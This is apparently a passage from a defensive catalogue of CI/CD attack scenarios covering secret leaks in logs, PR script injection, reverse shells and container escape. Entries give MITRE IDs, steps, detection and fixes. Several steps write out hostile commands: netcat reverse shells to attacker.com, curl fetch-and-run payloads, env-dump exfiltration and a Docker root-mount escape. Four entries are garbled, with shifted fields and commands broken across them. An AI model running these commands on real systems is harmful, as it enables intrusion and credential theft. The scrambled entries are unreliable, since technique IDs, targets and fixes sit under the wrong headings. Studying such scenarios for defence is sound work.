- **Attack Steps**: 1. Developer creates GitHub issue to report API malfunction.2. Pastes curl with real API token to demonstrate request-response behavior.3. Issue is public and indexable by search engines.4. GitGuardian scans public issues and flags token within minutes.5. Attacker uses the token to probe internal endpoints and retrieve user data.6. Detection via token use pattern mismatch and alerts from rate limits.7. Token is rotated and issues are redacted.8. All future bug reports mandate redacted examples + placeholder tokens.
- **Detection**: GitGuardian + manual audit
- **Solution**: Security policy for ticket redaction
- **Tags**: #issuetokenleak #debugcomment

## Terraform State File with Secrets Committed

- **Attack Type**: Infra State Exposure
- **Target**: Terraform Git Repo
- **Vulnerability**: Token in Infra State File
- **MITRE**: T1552.001
- **Impact**: Infra config compromise
- **Tools**: Terraform, GitHub, tfsec, TruffleHog
- **Scenario**: Sensitive secrets in Terraform .tfstate file exposed via version control
- **Attack Steps**: 1. Terraform file generates AWS resources with secrets_manager.2. The generated .tfstate file contains sensitive token outputs.3. Dev commits .tfstate to GitHub without adding it to .gitignore.4. Attacker scans GitHub for .tfstate and finds embedded tokens.5. Secrets are used to authenticate to internal APIs.6. Alerts triggered due to anomaly detection in API usage.7. State file is deleted from repo, secrets rotated.8. .tfstate explicitly ignored, and secrets moved to vault integrations.
- **Detection**: File scanning + anomaly alerts
- **Solution**: Vault + remote state with encryption
- **Tags**: #terraform #statefile #secretexposure

## GitHub Codespace Prebuild Leaks Token in Logs

- **Attack Type**: Prebuild Log Secret Exposure
- **Target**: GitHub Codespaces
- **Vulnerability**: Tokens in Debug Logs
- **MITRE**: T1552.001
- **Impact**: Remote API abuse via build artifact
- **Tools**: GitHub Codespaces, LogScanner, TruffleHog
- **Scenario**: Token is printed via debug echo in .devcontainer setup and captured in logs
- **Attack Steps**: 1. Developer adds echo $API_TOKEN in setup.sh for troubleshooting.2. Codespace logs retain the entire build output including secrets.3. Codespace is shared or forked publicly by another dev.4. Attacker reviews logs and copies token from setup logs.5. Token allows access to protected API endpoint.6. Detection triggered due to POSTs from untrusted IPs.7. Token revoked and all prebuild logs are deleted.8. Setup scripts are sanitized and debug logging removed in production.
- **Detection**: Prebuild log analysis + rate monitoring
- **Solution**: Remove echo/debug for secrets in build scripts
- **Tags**: #codespaces #logleak #buildpipeline

## Misconfigured GitHub Secret with Wildcard Perms

- **Attack Type**: Excessive Secret Scope
- **Target**: GitHub Actions
- **Vulnerability**: Over-privileged Secrets
- **MITRE**: T1552.001
- **Impact**: Internal repo tampering
- **Tools**: GitHub Actions, Repo Settings, IAM
- **Scenario**: GitHub secret has broader access than intended, misused in malicious workflow
- **Attack Steps**: 1. GitHub repo has PROD_TOKEN with write:repo permissions.2. Token is injected into Actions for deployment but not scope-restricted.3. Attacker submits a PR with a malicious build job that exfiltrates the token via external webhook.4. Token used to clone and modify other internal repositories.5. GitHub alerts for anomalous token use across unrelated projects.6. Incident team rotates all repo tokens.7. Secret scoping reviewed and re-issued with minimal privileges.8. PR workflows updated with stricter job permissions and audit.
- **Detection**: Token scope audit + webhook inspection
- **Solution**: Principle of least privilege on all tokens
- **Tags**: #tokenmisuse #githubactions #wildcardperm

## Public Docker Image with Build Script Containing Token

- **Attack Type**: Token Leak in Entrypoint Script
- **Target**: Docker Container
- **Vulnerability**: Tokens in Static Entrypoint Script
- **MITRE**: T1552.001
- **Impact**: Staging environment intrusion
- **Tools**: Docker, Docker Hub, Dive, TruffleHog
- **Scenario**: Docker image published to Docker Hub contains token in startup script
- **Attack Steps**: 1. Docker image includes entrypoint.sh script with hardcoded token.2. Image is pushed to Docker Hub as public by accident.3. Researcher downloads image, inspects layers using Dive and finds token.4. Token used to access staging environment of internal APIs.5. Cloud logs alert due to token use from external source.6. Docker image pulled, token rotated, and image deleted from public registry.7. Image rebuild process updated with build-time secrets only.8. Devs instructed on not baking secrets into containers.
- **Detection**: Container image scanning
- **Solution**: Build-time secret injection, runtime config only
- **Tags**: #dockerhub #entrypointleak #containers

## Git Credential Helper Accidentally Commits Token Cache

- **Attack Type**: Credential Cache Exposure
- **Target**: Git Config
- **Vulnerability**: Git Credential Cache Committed
- **MITRE**: T1552.001
- **Impact**: Repo access breach
- **Tools**: Git, TruffleHog, .gitconfig
- **Scenario**: Token stored in credential helper .git-credentials gets committed by mistake
- **Attack Steps**: 1. Git user enables credential caching and stores access tokens in plaintext .git-credentials.2. This file is not in .gitignore and gets committed during a git add . operation.3. Attacker browsing repo sees the .git-credentials with active token.4. Uses it to access private GitHub projects.5. Access from anomalous location is flagged.6. File is removed and credential helper disabled.7. Commit history is scrubbed and .gitignore updated across repos.8. Developers taught to never persist credentials locally.
- **Detection**: Git config audit + secret scan
- **Solution**: Disable persistent git credential caching
- **Tags**: #githelper #tokenexposed #gitcredential

## GitHub Fork Exposes Secrets from Private Repo

- **Attack Type**: Fork Inheritance Leak
- **Target**: GitHub Fork
- **Vulnerability**: Leak During Public Fork of Private
- **MITRE**: T1552.001
- **Impact**: API access, service exposure
- **Tools**: GitHub Forks, TruffleHog, GitGuardian
- **Scenario**: Developer forks private repo and pushes it to public GitHub without cleanup
- **Attack Steps**: 1. Developer clones private repo for demo.2. Accidentally pushes fork to public GitHub.3. .env, config.json, and logs all include valid tokens.4. Attacker monitors new repos by orgs and clones it instantly.5. Tokens give access to API, test accounts and internal dashboards.6. Alert generated from monitoring of new public forks via GitHub webhook.7. Fork deleted, secrets revoked, and repo access re-reviewed.8. Policy enforced: no forks outside org without review + secrets rotation automated on fork.
- **Detection**: Webhook alert + GitGuardian
- **Solution**: Fork permission lockdown + automated scanning
- **Tags**: #githubfork #tokeninheritance #misconfig

## GitHub Gist Used for Secret Sharing Leaked

- **Attack Type**: Pastebin-style Leak
- **Target**: GitHub Gist
- **Vulnerability**: Public Secret Paste
- **MITRE**: T1552.001
- **Impact**: Cloud resource access
- **Tools**: GitHub Gists, TruffleHog, Regex Hunters
- **Scenario**: Developer uses GitHub Gist to share keys temporarily, later forgets to delete
- **Attack Steps**: 1. Dev shares deployment credentials temporarily via GitHub Gist with peer.2. Gist is created as public due to default selection.3. Indexing engines crawl and archive the Gist.4. Token is harvested using keyword search or GitHub dorking.5. Access is used for cloud dashboard and APIs.6. CloudWatch flags login from unapproved IP and triggers MFA alert.7. Secret revoked and Gist deleted.8. Org-wide policy updated to forbid public gists and use vaults or secure mail.
- **Detection**: Gist monitoring + GitHub dorking alerts
- **Solution**: Private vault sharing only, no temp plaintext tokens
- **Tags**: #gistleak #tokenpaste #sharingsecrets

## GitHub Actions Print AWS Keys via echo

- **Attack Type**: Debug Echo Reveals Secrets
- **Target**: GitHub Actions
- **Vulnerability**: Echo leaks sensitive env vars
- **MITRE**: T1552.001
- **Impact**: Unauthorized cloud access
- **Tools**: GitHub Actions, AWS CLI
- **Scenario**: A developer echoes $AWS_SECRET_KEY for debugging; output gets stored in logs
- **Attack Steps**: 1. Developer is troubleshooting deployment issues and adds echo $AWS_SECRET_KEY to the YAML workflow.2. On execution, the actual AWS secret key is printed directly in the GitHub Actions job logs.3. Logs are stored in build artifacts and are publicly accessible if repo is open source.4. Threat actor scrapes public workflows using GitHub API for repositories using AWS.5. Key is harvested and used to authenticate to AWS with aws configure.6. Attacker launches EC2 enumeration commands.7. AWS GuardDuty detects odd behavior from an unrecognized IP and alerts.8. Blue team revokes key, scrubs logs, and reconfigures workflow with secret masking.
- **Detection**: Log content analysis
- **Solution**: Enable secret masking, avoid echoing tokens
- **Tags**: #ci/cd #logleak #githubactions

## Jenkins Console Shows Basic Auth Header

- **Attack Type**: Header Leak in Failed Request
- **Target**: Jenkins CI
- **Vulnerability**: Verbose request reveals secrets
- **MITRE**: T1552.003
- **Impact**: Token abuse, internal API tampering
- **Tools**: Jenkins, Curl, Console Log
- **Scenario**: A curl command fails and dumps headers with secrets to Jenkins console
- **Attack Steps**: 1. Jenkins pipeline includes a curl command with a -v flag for verbosity.2. Basic authentication header includes a Base64-encoded API token (e.g., Authorization: Basic dXNlcjpzZWNyZXQ=).3. curl encounters an HTTP 500 error and prints full request details to stdout.4. Jenkins logs everything to its console log which is accessible via build URL.5. An external user monitoring Jenkins build feeds discovers the logs.6. The decoded token is used to interact with internal APIs of the organization.7. Rate-limiting triggers detection due to access from an unexpected ASN.8. Token is revoked and Jenkins build verbosity is restricted going forward.
- **Detection**: Jenkins log audit
- **Solution**: Sanitize error logs, avoid -v in curl in CI
- **Tags**: #jenkins #basicauth #logexposure

## GitLab Runner Logs Show Unmasked Secret During Failure

- **Attack Type**: Masking Misconfigured in CI Logs
- **Target**: GitLab CI
- **Vulnerability**: Failure prints env vars to logs
- **MITRE**: T1552.001
- **Impact**: Messaging spam, webhook abuse
- **Tools**: GitLab CI, GitLab Runners
- **Scenario**: GitLab CI/CD logs expose secrets when step fails and variables are printed
- **Attack Steps**: 1. GitLab pipeline uses predefined variable $SLACK_WEBHOOK_SECRET in notification stage.2. Variable is used in a faulty curl call which fails due to malformed JSON.3. The CI system logs the full command and variable value due to failed step.4. Logs are stored in GitLab’s job artifacts and kept for 30 days.5. Attacker with access to GitLab group pulls old job logs and harvests the webhook URL.6. Attacker sends spam via Slack integration.7. Security team revokes webhook and revises variable masking settings.8. GitLab config updated to prevent logs from printing on failure unless explicitly enabled.
- **Detection**: CI log parser tools
- **Solution**: Use GitLab’s masked/secure variable settings
- **Tags**: #gitlab #logleak #webhookexposed

## Travis CI Public Log Archive Contains API Key

- **Attack Type**: Archived Logs With Token
- **Target**: Travis CI
- **Vulnerability**: Unsecured public build logs
- **MITRE**: T1552.001
- **Impact**: Access to staging services
- **Tools**: Travis CI, TruffleHog
- **Scenario**: Travis CI log archives contain secrets from earlier jobs with echo commands
- **Attack Steps**: 1. Developer adds echo $API_KEY in Travis .travis.yml for debugging.2. CI job succeeds and output is stored in build logs.3. Logs are archived and indexed by third-party CI log mirrors.4. Attacker uses search engine queries (dorks) like site:travis-ci.com "Authorization: Bearer" to find secrets.5. Found API key is used to interact with staging backend.6. Security team gets alerts from unusual request origins.7. Token revoked and Travis logs purged.8. Travis config updated to remove echo and switch to encrypted secrets.
- **Detection**: Log leak detection via dorking
- **Solution**: Use Travis’s encrypted secrets + rotate tokens regularly
- **Tags**: #travisci #apikey #buildleaks

## Azure DevOps Build Logs Print Database Credentials

- **Attack Type**: Config File Printed in Logs
- **Target**: Azure DevOps
- **Vulnerability**: Printed secret configs in CI steps
- **MITRE**: T1552.001
- **Impact**: DB exfiltration, lateral movement
- **Tools**: Azure DevOps Pipelines, Az CLI
- **Scenario**: A cat config.json command prints database creds into build logs
- **Attack Steps**: 1. A build step accidentally includes cat ./secrets/config.json for confirmation.2. Config file contains fields like "db_user": "admin" and "db_pass": "admin123".3. Entire JSON is dumped into build logs.4. Build logs are retained and accessible to internal users by default.5. Insider copies the database credentials and connects to prod DB.6. Azure Security Center flags anomalous SQL activity.7. Database passwords are rotated and access logs reviewed.8. Build process is updated to never include sensitive file read commands.
- **Detection**: Log monitor + SQL anomaly detector
- **Solution**: Avoid printing secret files, move to Azure Key Vault
- **Tags**: #azuredevops #buildlogs #dbcreds

## Jenkins Pipeline Logs Reveal GitHub Token

- **Attack Type**: SCM Token Leak in Git Logs
- **Target**: Jenkins
- **Vulnerability**: SCM token logged via git command
- **MITRE**: T1552.001
- **Impact**: Source code exfiltration
- **Tools**: Jenkins, Git, GitHub PAT
- **Scenario**: Jenkins logs include GitHub Personal Access Token while pulling private repo
- **Attack Steps**: 1. Jenkins pipeline uses a script to clone a private GitHub repo via HTTPS with PAT.2. Clone command looks like git clone https://<token>@github.com/org/repo.git.3. This command gets echoed into console logs when Jenkins verbosity is high.4. Jenkins logs are retained and exposed through public-facing web dashboard.5. Attacker scrapes logs and uses token to access private repos.6. GitHub detects access anomalies and suspends token.7. Jenkins pipeline is reconfigured to use SSH keys and store secrets in credentials plugin.
- **Detection**: GitHub alert + Jenkins log review
- **Solution**: Use credential store plugin + restrict logging
- **Tags**: #jenkins #githubtoken #gitclone

## CircleCI Debug Mode Dumps Token via Env Print

- **Attack Type**: Debug Mode Log Dump
- **Target**: CircleCI
- **Vulnerability**: All env vars dumped into logs
- **MITRE**: T1552.001
- **Impact**: Secrets spread through debug trace
- **Tools**: CircleCI, Bash, TruffleHog
- **Scenario**: printenv in CircleCI debug mode logs entire env, including secrets
- **Attack Steps**: 1. CircleCI debug mode is activated by a developer.2. A troubleshooting step includes printenv or env to review environment variables.3. Output includes secrets such as JWT_SECRET, DB_PASS, etc.4. Logs are streamed to CircleCI console and kept for 30 days.5. Logs accessed by other devs or SOC team inadvertently leak secrets.6. One of them gets exfiltrated via screenshot sharing or download.7. Tokens are rotated, and debug usage is formally reviewed.8. Policy added to prevent use of printenv or set on production builds.
- **Detection**: Log retention policy check
- **Solution**: Turn off debug in production pipelines
- **Tags**: #circleci #debugenv #secretdump

## Bitbucket Pipelines Log Includes Slack Webhook

- **Attack Type**: Webhook Leak via Notification Job
- **Target**: Bitbucket Pipelines
- **Vulnerability**: Slack webhook URL printed in logs
- **MITRE**: T1552.003
- **Impact**: Internal spam, service disruption
- **Tools**: Bitbucket Pipelines, Bash, Slack
- **Scenario**: Notification script prints webhook URL during test notification run
- **Attack Steps**: 1. Dev writes a script that sends build status to Slack using curl -X POST $SLACK_HOOK.2. A syntax error in script causes curl to fail and reprint the entire command.3. Logs print the full webhook URL embedded in command.4. Bitbucket stores logs under Pipelines tab; accessible by anyone in the workspace.5. Malicious insider uses webhook to spam internal Slack channels.6. Slack suspends the webhook after alerting admin.7. New secure webhook URL is generated and secrets are moved to env vars with masking.
- **Detection**: Bitbucket log audit
- **Solution**: Enforce webhook masking + add error handling in scripts
- **Tags**: #bitbucket #slackhook #pipelineleak

## GCP Cloud Build Prints GCS Signed URL in Log

- **Attack Type**: Signed URL Leak in Console Log
- **Target**: Google Cloud Build
- **Vulnerability**: GCS token URL exposed in build logs
- **MITRE**: T1552.001
- **Impact**: Prebuilt binary exfiltration
- **Tools**: Google Cloud Build, GCS
- **Scenario**: GCS signed URL used for deployment shows up in build logs
- **Attack Steps**: 1. GCP Cloud Build step uses a signed GCS URL to pull a prebuilt binary.2. Developer logs the URL via echo to ensure link is working.3. Log includes full URL with signature, expiration timestamp, and bucket path.4. An external user with viewer access to logs finds URL before expiry.5. File is downloaded and analyzed.6. Blue team purges the signed URL and disables future public access tokens.7. Cloud Build configuration is modified to avoid echoing signed links.
- **Detection**: Cloud Build logs audit
- **Solution**: Avoid logging signed URLs + shorten token TTL
- **Tags**: #gcs #signedurl #cloudbuild

## Drone CI Plugin Echoes OAuth Token in Custom Script

- **Attack Type**: OAuth Token in Plugin Output
- **Target**: Drone CI
- **Vulnerability**: Token visible in plugin log output
- **MITRE**: T1552.001
- **Impact**: OAuth misuse, app data query
- **Tools**: Drone CI, OAuth2, Bash
- **Scenario**: Custom plugin uses echo to verify token existence before POST, leaks it
- **Attack Steps**: 1. Custom Drone plugin contains echo $OAUTH_TOKEN for debugging integration.2. Token is echoed and logged by the Drone runner.3. Logs are visible to all project contributors with CI access.4. Token used to call user-profile API on internal app.5. API logs anomalous requests and raises alert.6. Incident response includes rotating token, revoking plugin permissions.7. Plugin modified to obfuscate tokens and all CI contributors briefed on secure scripting.
- **Detection**: Plugin audit + API anomaly logs
- **Solution**: Redact tokens in plugin scripts
- **Tags**: #droneci #oauth #pluginleak

## PR Injection Executes Crypto Miner in GitHub Actions

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitHub Actions
- **Vulnerability**: PR-based script execution
- **MITRE**: T1203
- **Impact**: Crypto mining on CI runners
- **Tools**: GitHub Actions, Bash
- **Scenario**: PR to open-source repo injects script that runs crypto miner
- **Attack Steps**: 1. An attacker forks a popular open-source repository using GitHub Actions.2. They modify a README file but also secretly inject a malicious curl command inside a script that runs on PR events.3. The project maintainers have CI workflows configured to run on pull_request events with write permissions.4. The malicious command executes and pulls a crypto-mining script hosted on Pastebin.5. GitHub-hosted runners execute the script for hours before it is noticed, consuming GitHub’s compute budget.6. Other contributors begin to see elevated costs and reduced CI performance.7. Maintainers audit workflows and realize the on: pull_request events should not have write permissions.8. CI policies are updated, PR triggers are sandboxed, and GitHub tokens for workflows are downgraded to read-only.
- **Detection**: GitHub billing dashboard, runner CPU alerts
- **Solution**: Use pull_request_target or read-only PR workflows
- **Tags**: #githubactions #ci #cryptominer #scriptinjection

## Jenkins Executes Shell via Malicious Commit Hook

- **Attack Type**: Unrestricted Script Execution
- **Target**: Jenkins
- **Vulnerability**: Executable commit files
- **MITRE**: T1059.004
- **Impact**: Remote shell to CI runner
- **Tools**: Jenkins, Git, Bash
- **Scenario**: Jenkins job configured with Execute shell blindly trusts commit hook input
- **Attack Steps**: 1. Jenkins multibranch pipeline automatically runs build.sh from any branch commit.2. A contributor forks the repo and modifies build.sh to include rm -rf /tmp/*; nc attacker.com 4444 -e /bin/bash.3. Once the PR is made, Jenkins pulls the branch and executes the build script.4. The nc command creates a reverse shell from Jenkins build agent to attacker-controlled server.5. The attacker now has interactive shell access to the Jenkins worker.6. Sensitive environment variables like AWS_SECRET_ACCESS_KEY and DB_PASSWORD are dumped.7. Logs are erased using shred and CI artifacts deleted post-build.8. Blue team detects abnormal outbound connections and revokes tokens, rebuilds Jenkins agent with stricter sandboxing.
- **Detection**: Network firewall, Jenkins logs
- **Solution**: Disallow user scripts in shared runners, use signed commits
- **Tags**: #jenkins #rce #reverse_shell #pipeline

## GitLab CI: RCE via .gitlab-ci.yml Variable Injection

- **Attack Type**: Unrestricted Script Execution
- **Target**: nc attacker.com`.3. The job is trusted and picked up by GitLab Runner because it’s running in shared runner mode with no job validation.4. GitLab logs show the job running successfully and database credentials being exfiltrated.5. Developer pretends it was an accidental misconfiguration.6. SOC team correlates timeline and detects suspicious DNS lookups to attacker.com.7. Blue team disables YAML file editing in forks and implements approval process for CI config changes.8. The GitLab Runner is reconfigured to reject new YAML structure without manual validation.
- **Vulnerability**: GitLab CI
- **MITRE**: YAML variable abuse
- **Impact**: T1220
- **Tools**: GitLab CI, GitLab UI
- **Scenario**: User modifies .gitlab-ci.yml in merge request to execute harmful code
- **Attack Steps**: 1. A developer submits a merge request with changes in application code and .gitlab-ci.yml.2. The CI file includes an additional job that runs `echo $DB_PASSWORD
- **Detection**: Secret exfiltration from CI environment
- **Solution**: GitLab Runner audit logs, DNS logs
- **Tags**: Require CI job approval from secure maintainers

## Jenkins Shared Agent Exposes SSH Keys via Script

- **Attack Type**: Unrestricted Script Execution
- **Target**: Jenkins
- **Vulnerability**: Cross-job artifact leak
- **MITRE**: T1083
- **Impact**: Lateral movement from one CI job to another
- **Tools**: Jenkins, SSH, Bash
- **Scenario**: Shared Jenkins agent used by multiple jobs leaks private keys due to careless scripting
- **Attack Steps**: 1. Multiple teams use a shared Jenkins agent for cost savings.2. A pipeline adds a cp ~/.ssh/id_rsa /tmp/keydump step for testing connectivity.3. Another job running on the same agent scans /tmp and retrieves the key.4. The key allows SSH access to deployment servers used by the original pipeline.5. Logs show the same agent IP being reused within 5 seconds for malicious SSH login.6. Jenkins logs show process list history indicating job overlap.7. SOC disables the shared agent pool and enables isolated containers per job.8. SSH keys are revoked, and key-based access is switched to short-lived tokens via Vault.
- **Detection**: Jenkins job PID trace, SSH access logs
- **Solution**: Use ephemeral workers, clean /tmp post-job
- **Tags**: #sshkeyleak #jenkins #ciabuse

## RCE via .env Sourcing in GitHub Actions

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitHub Actions
- **Vulnerability**: Sourced .env file executes code
- **MITRE**: T1059.005
- **Impact**: CI secrets theft via .env trick
- **Tools**: GitHub Actions, Bash
- **Scenario**: Attacker modifies .env and GitHub workflow sources it blindly
- **Attack Steps**: 1. Developer configures workflow to run source .env && npm run build.2. An attacker submits PR with a modified .env file including export MAL=($(curl attacker.com/sh)).3. The CI environment blindly sources .env, executing arbitrary code wrapped in export.4. GitHub Action runs npm run build but also executes the malicious curl, which downloads and runs a script.5. The attacker gains access to secrets stored in environment context.6. GitHub alerts flag an unusual job execution time and increased data egress.7. Workflow is rewritten to use a sanitized .env.example file validated against schema.8. All secret contexts are rotated and audit logs scanned.
- **Detection**: GitHub Actions logs, file diff history
- **Solution**: Never source .env without validation
- **Tags**: #githubactions #envsourcing #rceviaenv

## Bash Alias Abuse in GitLab CI

- **Attack Type**: Unrestricted Script Execution
- **Target**: bash && npm'.<br>2. .bashrcis sourced in the GitLab CI pipeline before running project build.<br>3. The alias gets activated and prepends malicious logic to everynpm` call.4. Malicious script installs a crypto miner and creates a hidden user on the host.5. GitLab job shows no failures but results in reduced build speed.6. Monitoring flags long job runtimes and irregular curl connections.7. Alias injection is discovered via environment inspection and file hash comparisons.8. CI config is hardened to use containerized runners with immutable shells.
- **Vulnerability**: GitLab CI
- **MITRE**: Aliases used to hijack commands
- **Impact**: T1059.004
- **Tools**: GitLab CI, Bash
- **Scenario**: Malicious alias redefines standard commands to inject attacker logic
- **Attack Steps**: 1. A contributor submits a .bash_aliases file with an alias like `alias npm='curl attacker.com/evil.sh
- **Detection**: Resource hijacking, privilege persistence
- **Solution**: File integrity monitor, CI output runtime stats
- **Tags**: Disallow sourcing arbitrary bashrc, validate shell env

## Jenkins Plugin Backdoor via CI Script Injection

- **Attack Type**: Unrestricted Script Execution
- **Target**: Jenkins
- **Vulnerability**: Untrusted plugin installation
- **MITRE**: T1059.006
- **Impact**: Supply chain compromise via CI
- **Tools**: Jenkins, Bash, Custom Plugin
- **Scenario**: Jenkins pipeline installs malicious plugin from external source
- **Attack Steps**: 1. A pipeline installs Jenkins plugins via CLI using install-plugin.sh script.2. A PR includes a modified plugin URL pointing to a malicious .hpi file hosted on a fake S3 bucket.3. Jenkins installs the plugin without verifying SHA hash or source.4. The plugin contains logic that exfiltrates build artifacts and credentials to the attacker.5. Post-deployment, several internal binaries are missing or altered.6. Blue team reviews plugin history and finds the malicious source.7. Jenkins is reverted from snapshot backup, plugin trust policy enforced.
- **Detection**: Jenkins plugin logs, network exfil logs
- **Solution**: Verify plugin signatures, enforce plugin whitelisting
- **Tags**: #jenkins #plugininjection #supplychain

## Malicious PR Hijacks Slack Notification Job

- **Attack Type**: Unrestricted Script Execution
- **Target**: curl -d @- attacker.com` before the Slack message.3. Maintainers approve PR without noticing the additional job logic.4. GitHub Actions executes the modified step and all env secrets are posted to the attacker.5. Slack webhook sends a success message while exfiltration goes unnoticed.6. Blue team flags the webhook as suspicious after matching tokens in data breach dump.7. Webhook keys are revoked, and diff tools enforced in PR approvals.
- **Vulnerability**: GitHub Actions
- **MITRE**: Script modifies Slack job to leak secrets
- **Impact**: T1565.001
- **Tools**: GitHub Actions, Slack API
- **Scenario**: Attacker edits notification step to send all env secrets to Slack instead
- **Attack Steps**: 1. CI pipeline includes a final job to notify deployment status to Slack using webhook.2. Attacker modifies the workflow to include `env
- **Detection**: Credential theft hidden in notification jobs
- **Solution**: Slack webhook logs, GitHub job audit
- **Tags**: Enforce approval checks on CI scripts

## Bash Function Overload in Jenkins Pipeline

- **Attack Type**: Unrestricted Script Execution
- **Target**: bash`.5. Blue team sees no logs for 20 minutes and investigates hanging job.6. Network egress reveals long outbound sessions from Jenkins worker.7. Job is terminated, and Jenkins sandbox is enforced with restricted shells.8. CI logs are audited and alert thresholds updated for silent/no-output jobs.
- **Vulnerability**: Jenkins
- **MITRE**: Bash function hijacking
- **Impact**: T1059.004
- **Tools**: Jenkins, Bash
- **Scenario**: Attacker redefines core bash functions like echo to mask actions
- **Attack Steps**: 1. A malicious PR includes .bash_functions that redefines echo() to log to /dev/null.2. The Jenkins pipeline sources these functions before running steps.3. Because echo is used throughout the script, nothing is printed to console.4. Hidden inside the steps is `curl attacker.com/evil.sh
- **Detection**: Silent remote execution on Jenkins agents
- **Solution**: Network traffic, Jenkins job timing
- **Tags**: Use restricted shells, disable user-defined functions

## GitLab CI Reads User Token via id Trick

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitLab CI
- **Vulnerability**: PATH hijack via command override
- **MITRE**: T1574.001
- **Impact**: Token exfiltration via fake binaries
- **Tools**: GitLab CI, Bash
- **Scenario**: Script uses id command override to read secret tokens
- **Attack Steps**: 1. Attacker places a script in repo that overrides system id command with a local file.2. The fake id binary is placed in project directory and prepended to PATH in .gitlab-ci.yml.3. The fake command reads GitLab access tokens from environment and prints them.4. Logs capture token output and attacker scrapes them from GitLab job log.5. Tokens used to access other CI projects and clone internal repos.6. Blue team isolates access to affected group and resets tokens.7. .gitlab-ci.yml policy updated to sanitize PATH usage and disallow local overrides.
- **Detection**: GitLab log output, PATH audit
- **Solution**: Strip PATH before job, prevent local binary usage
- **Tags**: #gitlab #pathhijack #ciinjection

## GitHub Action Runs Malicious PR Script with Embedded Keylogger

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitHub Actions
- **Vulnerability**: Unsafe execution of unverified install script
- **MITRE**: T1056.001
- **Impact**: Credential compromise through GitHub runner abuse
- **Tools**: GitHub Actions, Python, pynput
- **Scenario**: A malicious PR injects an obfuscated keylogger in setup.py which silently runs on GitHub runner
- **Attack Steps**: 1. An attacker forks a public repo and inserts a keylogger inside a modified setup.py script.2. This script uses the pynput module to track keystrokes.3. The attacker opens a PR that triggers GitHub Actions via pull_request_target event.4. During the job run, the GitHub-hosted runner installs dependencies and silently runs the injected script.5. All keystrokes entered by the job’s shell, including secret prompts and tokens, are logged to a local file.6. A follow-up command inside the script base64-encodes and uploads the log file to an external HTTP endpoint.7. The attacker periodically scrapes the endpoint and collects the keylog dumps.8. The SOC team later notices suspicious shell interaction times and external traffic to non-whitelisted domains during CI jobs.
- **Detection**: Outbound DNS/HTTP monitoring, keystroke delay detection
- **Solution**: Disable pull_request_target, enforce reviewed actions
- **Tags**: #keylogger #githubci #pullrequestabuse

## Jenkins PR Pipeline Executes Docker Command to Escape Host

- **Attack Type**: Unrestricted Script Execution
- **Target**: Jenkins
- **Vulnerability**: Docker socket misuse for privilege escalation
- **MITRE**: T1611
- **Impact**: Full CI server compromise
- **Tools**: Jenkins, Docker
- **Scenario**: A Jenkinsfile is modified to launch a container with the Docker socket mounted, allowing host takeover
- **Attack Steps**: 1. A contributor submits a PR modifying the Jenkinsfile to use docker run -v /:/mnt alpine chroot /mnt sh.2. Jenkins automatically picks up the change and runs the container.3. Mounting the Docker socket and root filesystem enables direct access to the CI host.4. Attacker navigates the host environment, installs persistence (e.g., SSH keys, cron jobs), and exfiltrates environment secrets.5. Remote command-and-control is established through reverse shell via the mounted filesystem.6. Blue team detects high I/O and unusual mount calls in Docker logs.7. Jenkins node is quarantined and rebuilt from secure image.8. Docker socket mounting is disabled for untrusted builds, and runners are isolated inside secure containers.
- **Detection**: Docker API call monitoring, system I/O alerts
- **Solution**: Remove Docker socket exposure, enforce least-privilege CI jobs
- **Tags**: #dockerescalation #jenkinsci #containerescape

## GitLab Self-Hosted Runner Executes Reverse Shell from .gitlab-ci.yml

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitLab CI
- **Vulnerability**: No outbound control in self-hosted runner
- **MITRE**: T1059.004
- **Impact**: Remote command execution via CI config
- **Tools**: GitLab CI, netcat
- **Scenario**: .gitlab-ci.yml is used to initiate a reverse shell via injected command in self-hosted runner
- **Attack Steps**: 1. Attacker creates a .gitlab-ci.yml with the line: before_script: nc attacker.com 4444 -e /bin/bash.2. GitLab pipeline executes the job on a self-hosted runner with no network restrictions.3. Reverse shell is established with full user privileges, giving attacker terminal access.4. Attacker navigates the CI environment, extracts tokens, credentials, SSH keys, and deployment configurations.5. Filesystem is exfiltrated and lateral scans are performed for reachable internal IPs.6. Incident response is triggered after IDS flags long-lived outbound TCP connection to an unknown host.7. GitLab runners are locked down with AppArmor and strict IP whitelists.8. Pipeline execution is set to require signed YAML and CI approval.
- **Detection**: Egress traffic detection, shell history correlation
- **Solution**: Restrict egress from CI runner, CI script validation
- **Tags**: #reverseShell #gitlab #ciabuse

## GitHub Actions Logs Leaked AWS Secrets via Debug Command

- **Attack Type**: Unrestricted Script Execution
- **Target**: GitHub Actions
- **Vulnerability**: Logging secrets to public CI logs
- **MITRE**: T1552.001
- **Impact**: Unauthorized cloud service abuse
- **Tools**: GitHub Actions, AWS CLI
- **Scenario**: Developer unknowingly logs sensitive variables like AWS secrets in job output
- **Attack Steps**: 1. A user adds a debug echo $AWS_SECRET_ACCESS_KEY to a build script during troubleshooting.2. The value is printed directly in GitHub Actions logs due to lack of redaction or masking.3. Logs are publicly accessible for PR builds due to repo configuration.4. Within minutes, the attacker harvests the log using GitHub search and uses the AWS key to spin up EC2 miners.5. Billing costs spike as 200+ EC2 instances start mining Monero.6. Blue team identifies the breach from AWS billing anomaly and revokes the compromised IAM credentials.7. GitHub Secrets are rotated, and PR jobs are modified to auto-sanitize logs.8. CI script reviewers now use linters to flag echo statements with sensitive vars.
- **Detection**: Billing alerts, CI audit logs
- **Solution**: Use ::add-mask::, scan for unmasked output
- **Tags**: #awsleak #cioutput #secretsinlogs

## Jenkinsfile Launches C2 Agent via Encrypted Python Payload

- **Attack Type**: Unrestricted Script Execution
- **Target**: Jenkins
- **Vulnerability**: Covert C2 via obfuscated script in CI
- **MITRE**: T1571
- **Impact**: Persistent remote access via CI runner
- **Tools**: Jenkins, Python, encrypted C2
- **Scenario**: A Python-based backdoor is silently launched during Jenkins job execution
- **Attack Steps**: 1. Jenkinsfile is altered to include: python3 agent.py.2. The agent.py is a stealthy, RC4-encrypted reverse shell script using obfuscation.3. Script opens port 443 pretending to be TLS handshake, but communicates to attacker's server.4. The C2 establishes persistence by dropping rc.local entry and a cronjob.5. Periodic data dumps from /var/lib/jenkins/secrets/ are exfiltrated via encrypted channel.6. DNS logs show repeated queries to a rare domain used as C2 beacon.7. Blue team correlates logs and finds malicious job artifacts.8. Jenkins job runners are sandboxed and script approval policy is enforced.
